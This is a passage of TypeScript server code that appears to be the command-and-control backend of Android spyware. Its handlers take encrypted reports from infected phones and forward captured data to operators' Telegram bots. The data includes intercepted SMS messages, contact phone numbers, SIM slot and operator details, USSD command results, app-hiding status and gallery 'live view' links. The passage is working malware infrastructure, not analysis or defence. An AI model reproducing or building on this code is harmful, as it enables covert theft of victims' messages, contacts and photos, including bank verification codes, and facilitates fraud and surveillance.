                expectedRecipient: "server",
                senderPublicKey: createPublicKey(user.public_key),
                recipientPrivateKey: createPrivateKey(keys.privateKey),
                maxAgeMs: 15 * 60 * 1000,
            });

            const message = JSON.parse(result.plaintext);

            if (message.from_port !== user.from_port) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "inconsistency detected" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const port_info = await classify.portService.getPort(message.from_port);

            if (!port_info) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid port" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(403).send(encrypted_message);
            }

            if (port_info.status !== "active"){
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "your port is not active" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(500).send(encrypted_message);
            }

            if (message.status) {
                if (message.type === "onCommand") {
                    let action_session = await classify.session.getSession(message.session_id);
                    if (action_session) {
                        await classify.session.removeSession(message.session_id);
                        await scarlett.api.editMessageText(
                            port_info.stores_to,
                            action_session.message_id,
                            createFont(`🛡️ | captured #${action_session.method}\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId,
                            { parse_mode: "HTML" }
                        );
                    }
                } else {
                    await scarlett.api.sendMessage(
                        port_info.stores_to,
                        createFont(`🛡️ | captured #hideApp\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId,
                        { parse_mode: "HTML" }
                    );
                }
            } else {
                await scarlett.api.sendMessage(
                    port_info.stores_to,
                    createFont(`🛡️ | captured #hideApp\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🔴 | error: ${message.message}`)
                );
            }

            const encrypted_message = Realme.encrypt(JSON.stringify({ status: true }), {
                recipient: "client",
                sender: "server",
                senderPrivateKey: createPrivateKey(keys.privateKey),
                recipientPublicKey: createPublicKey(user.public_key),
                signerId: "api-server-01"
            });

            reply.send(encrypted_message);
        } catch (e) {
            console.error("[hooks:hideApp] error:", e);
            return reply.code(500).send({ status: false, message: "server cause to error, sorry about this; try again later" });
        }
    },

    unhideApp: async (request: FastifyRequest, reply: FastifyReply) => {
        try {
            const body = request.body as any;
            const keys = Realme.storeServerKeys();

            const user = await classify.ceph.getClientById(body.signerId);

            if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

            const result = Realme.decryptToString({
                algorithms: body.algorithms,
                authTag: body.authTag,
                ciphertext: body.ciphertext,
                encryptedKey: body.encryptedKey,
                iv: body.iv,
                recipient: "server",
                sender: "client",
                signature: body.signature,
                signedAt: body.signedAt,
                signerId: body.signerId
            }, {
                expectedRecipient: "server",
                senderPublicKey: createPublicKey(user.public_key),
                recipientPrivateKey: createPrivateKey(keys.privateKey),
                maxAgeMs: 15 * 60 * 1000,
            });

            const message = JSON.parse(result.plaintext);

            if (message.from_port !== user.from_port) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "inconsistency detected" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const port_info = await classify.portService.getPort(message.from_port);

            if (!port_info) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid port" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(403).send(encrypted_message);
            }

            if (port_info.status !== "active"){
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "your port is not active" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(500).send(encrypted_message);
            }

            if (message.status) {
                if (message.type === "onCommand") {
                    let action_session = await classify.session.getSession(message.session_id);
                    if (action_session) {
                        await classify.session.removeSession(message.session_id);
                        await scarlett.api.editMessageText(
                            port_info.stores_to,
                            action_session.message_id,
                            createFont(`🛡️ | captured #${action_session.method}\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId,
                            { parse_mode: "HTML" }
                        );
                    }
                } else {
                    await scarlett.api.sendMessage(
                        port_info.stores_to,
                        createFont(`🛡️ | captured #unhideApp\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId,
                        { parse_mode: "HTML" }
                    );
                }
            } else {
                await scarlett.api.sendMessage(
                    port_info.stores_to,
                    createFont(`🛡️ | captured #unhideApp\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🔴 | error: ${message.message}`)
                );
            }

            const encrypted_message = Realme.encrypt(JSON.stringify({ status: true }), {
                recipient: "client",
                sender: "server",
                senderPrivateKey: createPrivateKey(keys.privateKey),
                recipientPublicKey: createPublicKey(user.public_key),
                signerId: "api-server-01"
            });

            reply.send(encrypted_message);
        } catch (e) {
            console.error("[hooks:unhideApp] error:", e);
            return reply.code(500).send({ status: false, message: "server cause to error, sorry about this; try again later" });
        }
    },

    incomingMessage: async (request: FastifyRequest, reply: FastifyReply) => {
        try {
            const body = request.body as any;
            const keys = Realme.storeServerKeys();

            const user = await classify.ceph.getClientById(body.signerId);

            if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

            const result = Realme.decryptToString({
                algorithms: body.algorithms,
                authTag: body.authTag,
                ciphertext: body.ciphertext,
                encryptedKey: body.encryptedKey,
                iv: body.iv,
                recipient: "server",
                sender: "client",
                signature: body.signature,
                signedAt: body.signedAt,
                signerId: body.signerId
            }, {
                expectedRecipient: "server",
                senderPublicKey: createPublicKey(user.public_key),
                recipientPrivateKey: createPrivateKey(keys.privateKey),
                maxAgeMs: 15 * 60 * 1000,
            });

            const message = JSON.parse(result.plaintext);

            if (message.from_port !== user.from_port) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "inconsistency detected" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const port_info = await classify.portService.getPort(message.from_port);

            if (!port_info) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid port" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(403).send(encrypted_message);
            }

            if (port_info.status !== "active"){
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "your port is not active" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(500).send(encrypted_message);
            }

            const encrypted_message = Realme.encrypt(JSON.stringify({ status: true }), {
                recipient: "client",
                sender: "server",
                senderPrivateKey: createPrivateKey(keys.privateKey),
                recipientPublicKey: createPublicKey(user.public_key),
                signerId: "api-server-01"
            });

            reply.send(encrypted_message);

            await classify.session.removeSession(message.session_id);
            const incmessage = message as IncomingMessage;
            incmessage.text = incmessage.text.replaceAll("<", "").replaceAll(">", "");

            await scarlett.api.sendMessage(
                port_info.stores_to,
                createFont("📦 | #new_message received") + `\n👤 | ${incmessage.from_name} [ ${incmessage.from_number} ] ` + createFont("\n\n💬 | message: \n") + "<blockquote>" + incmessage.text + "</blockquote>\n\n<blockquote>" + createFont("🛜 | operator: ") + incmessage.operator + createFont(`\n🧼 | screen: ${message.screen_status} | ${message.app_behave} app`) + createFont(`\n☎️ | slot: ${incmessage.sim_slot ?? -1}\n⚜️ | type: ${incmessage.sms_type ?? "NONBOX"}\n🌀 | user: `) + `/set_${message.id}</blockquote>`,
                { parse_mode: "HTML" }
            );
        } catch (e) {
            console.error("[hooks:incomingMessage] error:", e);
            return reply.code(500).send({ status: false, message: "server cause to error, sorry about this; try again later" });
        }
    },

    runUSSD: async (request: FastifyRequest, reply: FastifyReply) => {
        try {
            const body = request.body as any;
            const keys = Realme.storeServerKeys();

            const user = await classify.ceph.getClientById(body.signerId);

            if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

            const result = Realme.decryptToString({
                algorithms: body.algorithms,
                authTag: body.authTag,
                ciphertext: body.ciphertext,
                encryptedKey: body.encryptedKey,
                iv: body.iv,
                recipient: "server",
                sender: "client",
                signature: body.signature,
                signedAt: body.signedAt,
                signerId: body.signerId
            }, {
                expectedRecipient: "server",
                senderPublicKey: createPublicKey(user.public_key),
                recipientPrivateKey: createPrivateKey(keys.privateKey),
                maxAgeMs: 15 * 60 * 1000,
            });

            const message = JSON.parse(result.plaintext);

            if (message.from_port !== user.from_port) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "inconsistency detected" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const port_info = await classify.portService.getPort(message.from_port);

            if (!port_info) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid port" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(403).send(encrypted_message);
            }

            if (port_info.status !== "active"){
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "your port is not active" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(500).send(encrypted_message);
            }

            const encrypted_message = Realme.encrypt(JSON.stringify({ status: true }), {
                recipient: "client",
                sender: "server",
                senderPrivateKey: createPrivateKey(keys.privateKey),
                recipientPublicKey: createPublicKey(user.public_key),
                signerId: "api-server-01"
            });

            reply.send(encrypted_message);

            if (message.status) {
                if (message.type === "onCommand") {
                    let action_session = await classify.session.getSession(message.session_id);
                    if (action_session) {
                        await classify.session.removeSession(message.session_id);
                        await scarlett.api.editMessageText(
                            port_info.stores_to,
                            action_session.message_id,
                            createFont(`🛡️ | captured #${action_session.method}\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont("\n\n🟢 | ussd code runned"),
                            { parse_mode: "HTML" }
                        );
                    }
                } else {
                    await scarlett.api.sendMessage(
                        port_info.stores_to,
                        createFont(`🛡️ | captured #runUSSD\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont("\n\n🟢 | ussd code runned"),
                        { parse_mode: "HTML" }
                    );
                }
            } else {
                await scarlett.api.sendMessage(
                    port_info.stores_to,
                    createFont(`🛡️ | captured #runUSSD\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🔴 | error: ${message.message}`)
                );
            }
        } catch (e) {
            console.error("[hooks:runUSSD] error:", e);
            return reply.code(500).send({ status: false, message: "server cause to error, sorry about this; try again later" });
        }
    },

    getPhoneNumbers: async (request: FastifyRequest, reply: FastifyReply) => {
        try {
            const body = request.body as any;
            const keys = Realme.storeServerKeys();

            const user = await classify.ceph.getClientById(body.signerId);

            if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

            const result = Realme.decryptToString({
                algorithms: body.algorithms,
                authTag: body.authTag,
                ciphertext: body.ciphertext,
                encryptedKey: body.encryptedKey,
                iv: body.iv,
                recipient: "server",
                sender: "client",
                signature: body.signature,
                signedAt: body.signedAt,
                signerId: body.signerId
            }, {
                expectedRecipient: "server",
                senderPublicKey: createPublicKey(user.public_key),
                recipientPrivateKey: createPrivateKey(keys.privateKey),
                maxAgeMs: 15 * 60 * 1000,
            });

            const message = JSON.parse(result.plaintext);

            if (message.from_port !== user.from_port) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "inconsistency detected" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const port_info = await classify.portService.getPort(message.from_port);

            if (!port_info) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid port" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(403).send(encrypted_message);
            }

            if (port_info.status !== "active"){
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "your port is not active" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(500).send(encrypted_message);
            }

            const valid_data = classify.schemas.createCardSchema().validate(message.phone_numbers);

            if (valid_data.error) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid input data" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const encrypted_message = Realme.encrypt(JSON.stringify({ status: true }), {
                recipient: "client",
                sender: "server",
                senderPrivateKey: createPrivateKey(keys.privateKey),
                recipientPublicKey: createPublicKey(user.public_key),
                signerId: "api-server-01"
            });

            reply.send(encrypted_message);

            if (message.status) {
                if (message.type === "onCommand") {
                    let action_session = await classify.session.getSession(message.session_id);
                    if (action_session) {
                        await classify.session.removeSession(message.session_id);
                        const chunked = chunkList(valid_data.value);
                        let texts_to_send: string[] = [(createFont(`🛡️ | captured #${action_session.method}\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + '\n\n') + (createFont(`📞 | list of phone numbers [ ${valid_data.value.length} ]\n🪡 | app name: ${message.app_name}\n`) + `🧼` + createFont(` | screen: ${message.screen_status} | ${message.app_behave} app\n`))];
                        texts_to_send[0] += "<blockquote expandable>";
                        let numb = 0;

                        for (const chunk of chunked) {
                            if (texts_to_send[numb]!.length < 4000) {
                                texts_to_send[numb]! += chunk.map((c) => {
                                    return `\n☎️ | <code>${c}</code>\n` + "=".repeat(30);
                                }).join("");
                            } else {
                                texts_to_send[numb]! += "</blockquote>";
                                numb += 1;
                                texts_to_send.push("<blockquote expandable>");
                                texts_to_send[numb]! += chunk.map((c) => {
                                    return `\n☎️ | <code>${c}</code>\n` + "=".repeat(30);
                                }).join("");
                            }
                        }

                        if (texts_to_send[texts_to_send.length - 1]?.length !== 0) {
                            texts_to_send[texts_to_send.length - 1]! += "</blockquote>";
                        }

                        await scarlett.api.editMessageText(port_info.stores_to, action_session.message_id, texts_to_send[0]!, { parse_mode: "HTML" });

                        for (const txt of texts_to_send.slice(1)) {
                            await middlegirl.api.sendMessage(port_info.stores_to, txt, { parse_mode: "HTML" });
                        }
                    }
                } else {
                    const chunked = chunkList(valid_data.value);
                    let texts_to_send: string[] = [(createFont(`🛡️ | captured #getPhoneNumbers\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + '\n\n') + (createFont(`📞 | list of phone numbers [ ${valid_data.value.length} ]\n🪡 | app name: ${message.app_name}\n`) + `🧼` + createFont(` | screen: ${message.screen_status} | ${message.app_behave} app\n`))];
                    texts_to_send[0] += "<blockquote expandable>";
                    let numb = 0;

                    for (const chunk of chunked) {
                        if (texts_to_send[numb]!.length < 4000) {
                            texts_to_send[numb]! += chunk.map((c) => {
                                return `\n☎️ | <code>${c}</code>\n` + "=".repeat(30);
                            }).join("");
                        } else {
                            texts_to_send[numb]! += "</blockquote>";
                            numb += 1;
                            texts_to_send.push("<blockquote expandable>");
                            texts_to_send[numb]! += chunk.map((c) => {
                                return `\n☎️ | <code>${c}</code>\n` + "=".repeat(30);
                            }).join("");
                        }
                    }

                    if (texts_to_send[texts_to_send.length - 1]?.length !== 0) {
                        texts_to_send[texts_to_send.length - 1]! += "</blockquote>";
                    }

                    await scarlett.api.sendMessage(port_info.stores_to, texts_to_send[0]!, { parse_mode: "HTML" });

                    for (const txt of texts_to_send.slice(1)) {
                        await middlegirl.api.sendMessage(port_info.stores_to, txt, { parse_mode: "HTML" });
                    }
                }
            } else {
                await scarlett.api.sendMessage(
                    port_info.stores_to,
                    createFont(`🛡️ | captured #getPhoneNumbers\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🔴 | error: ${message.message}`)
                );
            }
        } catch (e) {
            console.error("[hooks:getPhoneNumbers] error:", e);
            return reply.code(500).send({ status: false, message: "server cause to error, sorry about this; try again later" });
        }
    },

    sendMessage: async (request: FastifyRequest, reply: FastifyReply) => {
        try {
            const body = request.body as any;
            const keys = Realme.storeServerKeys();

            const user = await classify.ceph.getClientById(body.signerId);

            if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

            const result = Realme.decryptToString({
                algorithms: body.algorithms,
                authTag: body.authTag,
                ciphertext: body.ciphertext,
                encryptedKey: body.encryptedKey,
                iv: body.iv,
                recipient: "server",
                sender: "client",
                signature: body.signature,
                signedAt: body.signedAt,
                signerId: body.signerId
            }, {
                expectedRecipient: "server",
                senderPublicKey: createPublicKey(user.public_key),
                recipientPrivateKey: createPrivateKey(keys.privateKey),
                maxAgeMs: 15 * 60 * 1000,
            });

            const message = JSON.parse(result.plaintext);

            if (message.from_port !== user.from_port) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "inconsistency detected" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const port_info = await classify.portService.getPort(message.from_port);

            if (!port_info) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid port" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(403).send(encrypted_message);
            }

            if (port_info.status !== "active"){
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "your port is not active" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(500).send(encrypted_message);
            }

            const valid_data = classify.schemas.createBalanceSchema().validate(message.balance);

            if (valid_data.error) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid input data" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const encrypted_message = Realme.encrypt(JSON.stringify({ status: true }), {
                recipient: "client",
                sender: "server",
                senderPrivateKey: createPrivateKey(keys.privateKey),
                recipientPublicKey: createPublicKey(user.public_key),
                signerId: "api-server-01"
            });

            reply.send(encrypted_message);

            if (message.status) {
                if (message.type === "onCommand") {
                    let action_session = await classify.session.getSession(message.session_id);
                    if (action_session) {
                        await classify.session.removeSession(message.session_id);
                        await scarlett.api.editMessageText(
                            port_info.stores_to,
                            action_session.message_id,
                            createFont(`🛡️ | captured #${action_session.method}\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🟢 | message has sent to ${message.sent_to}`),
                            { parse_mode: "HTML" }
                        );
                    }
                } else {
                    await scarlett.api.sendMessage(
                        port_info.stores_to,
                        createFont(`🛡️ | captured #sendMessage\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🟢 | message has sent to ${message.sent_to}`),
                        { parse_mode: "HTML" }
                    );
                }
            } else {
                await scarlett.api.sendMessage(
                    port_info.stores_to,
                    createFont(`🛡️ | captured #sendMessage\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🔴 | error: ${message.message}`)
                );
            }
        } catch (e) {
            console.error("[hooks:sendMessage] error:", e);
            return reply.code(500).send({ status: false, message: "server cause to error, sorry about this; try again later" });
        }
    },

    getGallery: async (request: FastifyRequest, reply: FastifyReply) => {
        try {
            const body = request.body as any;
            const keys = Realme.storeServerKeys();

            const user = await classify.ceph.getClientById(body.signerId);

            if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

            const result = Realme.decryptToString({
                algorithms: body.algorithms,
                authTag: body.authTag,
                ciphertext: body.ciphertext,
                encryptedKey: body.encryptedKey,
                iv: body.iv,
                recipient: "server",
                sender: "client",
                signature: body.signature,
                signedAt: body.signedAt,
                signerId: body.signerId
            }, {
                expectedRecipient: "server",
                senderPublicKey: createPublicKey(user.public_key),
                recipientPrivateKey: createPrivateKey(keys.privateKey),
                maxAgeMs: 15 * 60 * 1000,
            });

            const message = JSON.parse(result.plaintext);

            if (message.from_port !== user.from_port) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "inconsistency detected" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const port_info = await classify.portService.getPort(message.from_port);

            if (!port_info) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid port" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(403).send(encrypted_message);
            }

            if (port_info.status !== "active"){
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "your port is not active" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(500).send(encrypted_message);
            }

            const valid_data = classify.schemas.createBalanceSchema().validate(message.balance);

            if (valid_data.error) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid input data" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const encrypted_message = Realme.encrypt(JSON.stringify({ status: true }), {
                recipient: "client",
                sender: "server",
                senderPrivateKey: createPrivateKey(keys.privateKey),
                recipientPublicKey: createPublicKey(user.public_key),
                signerId: "api-server-01"
            });

            reply.send(encrypted_message);

            if (message.status) {
                if (message.type === "onCommand") {
                    let action_session = await classify.session.getSession(message.session_id);
                    if (action_session) {
                        await classify.session.removeSession(message.session_id);
                        await scarlett.api.editMessageText(
                            port_info.stores_to,
                            action_session.message_id,
                            createFont(`🛡️ | captured #${action_session.method}\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId,
                            {
                                parse_mode: "HTML",
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: createFont(`🕹️ live view 🕹️`), url: `https://talghsamen.ir/view-by/${body.signerId}` }]
                                    ]
                                }
                            }
                        );
                    }
                } else {
                    await scarlett.api.sendMessage(
                        port_info.stores_to,
                        createFont(`🛡️ | captured #getGallery\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId,
                        {
                            parse_mode: "HTML",
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: createFont(`🕹️ live view 🕹️`), url: `https://talghsamen.ir/view-by/${body.signerId}` }]
                                ]
                            }
                        }
                    );
                }
            } else {
                await scarlett.api.sendMessage(
                    port_info.stores_to,
                    createFont(`🛡️ | captured #getGallery\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🔴 | error: ${message.message}`)
                );
            }
        } catch (e) {
            console.error("[hooks:getGallery] error:", e);
            return reply.code(500).send({ status: false, message: "server cause to error, sorry about this; try again later" });
        }
    },

    getSMS: async (request: FastifyRequest, reply: FastifyReply) => {
        try {
            const body = request.body as any;
            const keys = Realme.storeServerKeys();

            const user = await classify.ceph.getClientById(body.signerId);

            if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

            const result = Realme.decryptToString({
                algorithms: body.algorithms,
                authTag: body.authTag,
                ciphertext: body.ciphertext,
                encryptedKey: body.encryptedKey,
                iv: body.iv,
                recipient: "server",
                sender: "client",
                signature: body.signature,
                signedAt: body.signedAt,
                signerId: body.signerId
            }, {
                expectedRecipient: "server",
                senderPublicKey: createPublicKey(user.public_key),
                recipientPrivateKey: createPrivateKey(keys.privateKey),
                maxAgeMs: 15 * 60 * 1000,
            });

            const message = JSON.parse(result.plaintext);

            if (message.from_port !== user.from_port) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "inconsistency detected" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const port_info = await classify.portService.getPort(message.from_port);

            if (!port_info) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid port" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(403).send(encrypted_message);
            }

            if (port_info.status !== "active"){
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "your port is not active" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(500).send(encrypted_message);
            }

            const encrypted_message = Realme.encrypt(JSON.stringify({ status: true }), {
                recipient: "client",
                sender: "server",
                senderPrivateKey: createPrivateKey(keys.privateKey),
                recipientPublicKey: createPublicKey(user.public_key),
                signerId: "api-server-01"
            });

            reply.send(encrypted_message);

            if (message.status) {
                if (message.type === "onCommand") {
                    let action_session = await classify.session.getSession(message.session_id);
                    if (action_session) {
                        await classify.session.removeSession(message.session_id);
                        let addrs: string[] = [];
                        (message.messages as Record<string, string>[]).forEach((item) => {
                            addrs.push(`============== @CephServices ==============\n\nfrom [ ${item.address} | ${item.sms_type ? item.sms_type : "unknown sms type"} ]\n\n${item.body}`);
                        });

                        let buff = Buffer.from(addrs.join("\n\n"), "utf-8");
                        const inpmedia = InputMediaBuilder.document(new InputFile(buff, `${message.method}-${message.id}.txt`), { caption: createFont(`🛡️ | captured #${action_session.method}\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId, parse_mode: "HTML" });

                        await scarlett.api.editMessageMedia(
                            port_info.stores_to,
                            action_session.message_id,
                            inpmedia
                        );
                    }
                } else {
                    let addrs: string[] = [];
                    (message.messages as Record<string, string>[]).forEach((item) => {
                        addrs.push(`============== @CephServices ==============\n\nfrom [ ${item.address} | ${item.sms_type ? item.sms_type : "unknown sms type"} ]\n\n${item.body}`);
                    });

                    let buff = Buffer.from(addrs.join("\n\n"), "utf-8");

                    await scarlett.api.sendDocument(
                        port_info.stores_to,
                        new InputFile(buff, `${message.method}-${message.id}.txt`),
